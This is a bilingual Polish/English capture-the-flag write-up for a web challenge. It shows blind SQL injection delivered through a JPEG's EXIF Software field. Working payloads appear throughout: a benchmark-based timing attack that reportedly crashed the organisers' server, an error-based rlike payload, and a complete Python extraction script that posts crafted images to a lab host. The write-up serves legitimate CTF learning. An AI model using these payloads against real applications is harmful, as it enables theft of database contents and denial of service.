## Limitless (web, 200p)

### PL

[ENG](#eng-version)

W zadaniu dostajemy link do webowego uploadera plików, oraz informacje, że mamy wyciągnąć jakieś informacje z tabeli `flag`.
Analiza uploadera oraz jego działania pozwala zauważyć, że uploader po załadowaniu pliku pobiera z niego dane `exif` a następnie na podstawie pola `exif.primary.Software` wyszukuje w bazie danych oraz wyświetla zdjęcia utworzone tym samym oprogramowaniem.

Zastosowaliśmy więc technikę `SQL Injection` poprzez pole exif, za pomocą skryptu:

```python
    img = pexif.JpegFile.fromFile("file.jpg")
    img.exif.primary.Software = '"&&' + sql + '#'
    img.writeFile('file.jpg')
```

Który dopisywał nasze zapytanie do pliku i przygotowywał je do wykonania. Zapytanie trafiało do klauzuli `where` zaraz za porównaniem ze stringiem. Niestety mieliśmy twarde ograniczenie wynoszące 50 znaków dla tego pola exif, co mocno ograniczało nasze możliwości.
Dodatkowo wykluczona była operacja union a tabela z której dokonywano selekcji miała 0 rekordów.

W związku z tym postanowiliśmy wykorzystać atak `remote timing` na bazę danych wraz z testowaniem pojedyńczych znaków jedynego elementu tabeli flags (gdzie spodziewaliśmy się flagi) - wykorzystać operator AND w wersji short-circuit i jeśli porównanie symbolu było niepoprawne wykonywaliśmy długo liczący się kod (sleep nie był dostępny). Z racji małej liczby znaków nie mogliśmy użyć funkcji `substring` ani `mid`, musieliśmy opierać się o przesuwające się okno ze znamym fragmentem flagi. Kod sql to:

```sql
benchmark(~-((select*from flag)like'%" + window + "%'),1)
```

Funkcja benchmark wykonuje podany kod tyle razy ile wynosi pierwszy argument. W naszym przypadku wartość boolean jest zamieniana na liczbę za pomocą unarnego minusa a następnie bity są negowane. Problem z tym rozwiązaniem polegał na tym, że taki benchmark wykonuje się bardzo (!) długo a w naszym kodzie uruchamiamy go dla każdego nie pasującego symbolu, więc dla każdego zgadywanego znaku pesymistycznie prawie 40 razy.

Skutek był taki, że położyliśmy serwer 5 razy uzyskując raptem 2/3 flagi a organizatorzy postanowili zablokować funkcję benchmark.

Nasze drugie podejście wykorzystało inny sposób - logowanie błędów mysql. Użyliśmy zapytania:

```sql
rlike(if(mid((select*from flag),"+CHARACTER_INDEX+",1)='"+CHARACTER+"','',1))
```

Dzięki czemu w zależności od spełnienia warunku skrypt wykonywał się poprawnie lub zgłaszał błąd składniowy.
Cały skrypt odzyskujący flagę:

```python
import pexif, subprocess

​def execute_sql(sql):
    img = pexif.JpegFile.fromFile("/var/www/html/img.jpg")
    img.exif.primary.Software = '"' + sql + '#'
    img.writeFile('/var/www/html/imgdest.jpg')
	return subprocess.check_output('curl -s -F submit=1 -F file=@/var/www/html/imgdest.jpg http://10.13.37.3', shell=True)

for i in range(1, 999):
    for c in (range(48, 58) + range(65, 91) + range(97, 126)):
        if 'expression' in execute_sql("rlike(if(mid((select*from flag),"+str(i)+",1)='"+chr(c)+"','',1))"):
            print chr(c),
            break
```

A jego wynik:

`DCTF{09D5D8300A7ADC45C5D434BB467F2A85}`

### ENG version

In the task we get a link to a web file upoloader and an information that we need to extract some data from `flag` table.
Analysis of the uploader and its behaviour reveals that the uploader, after loading the file, collected `exif` data and then based on `exif.primary.Software` finds and displays other pictures made with the same software.

We used `SQL Injection` via exif field using script:

```python
    img = pexif.JpegFile.fromFile("file.jpg")
    img.exif.primary.Software = '"&&' + sql + '#'
    img.writeFile('file.jpg')
```

This script was adding the query to the file and preparing it for execution. The query was then placed in `where` clause, right after the comparison with a string. Unfortunately we hade a hard limit of 50 characters for the query, which was a strong limiting factor. On top of that it was impossible to use `union` and the table on which the selection was executed had 0 rows.

Therefore we decided to use `remote timing` attack on the database with testing single character of the sole element of flags table (where we expected to find the flag) - using short-circuit AND operator and if the condition was not matching we were executing a long running task (sleep was unavailable). Since the characters number limitation we could not use `substring` or `mid` functions and we had to relay on a moving window with known flag prefix/suffix. The SQL code was:

```sql
benchmark(~-((select*from flag)like'%" + window + "%'),1)
```

Benchmark function executes given code as many times as stated in the first argunent. In our case boolean is converted to int via unary minus and then bits are negated. The problem was that this benchmark executes really long (!) and in our code we we run it for every non matching symbol, so for any guessed character we might use almost 40 of those processes.

As a result we crashed the server 5 times and still got only 2/3 of the flag and organisers finally decided to block benchmark function.

Our second attempt was using a different approach - exploiting errors in mysql. We used:

```sql
rlike(if(mid((select*from flag),"+CHARACTER_INDEX+",1)='"+CHARACTER+"','',1))
```

And therefore the script would execute normally or crash with a syntax error, depending on the condition value.
Whole script for extracting the flag:

```python
import pexif, subprocess

​def execute_sql(sql):
    img = pexif.JpegFile.fromFile("/var/www/html/img.jpg")
    img.exif.primary.Software = '"' + sql + '#'
    img.writeFile('/var/www/html/imgdest.jpg')
	return subprocess.check_output('curl -s -F submit=1 -F file=@/var/www/html/imgdest.jpg http://10.13.37.3', shell=True)

for i in range(1, 999):
    for c in (range(48, 58) + range(65, 91) + range(97, 126)):
        if 'expression' in execute_sql("rlike(if(mid((select*from flag),"+str(i)+",1)='"+chr(c)+"','',1))"):
            print chr(c),
            break
```

And the result.

`DCTF{09D5D8300A7ADC45C5D434BB467F2A85}`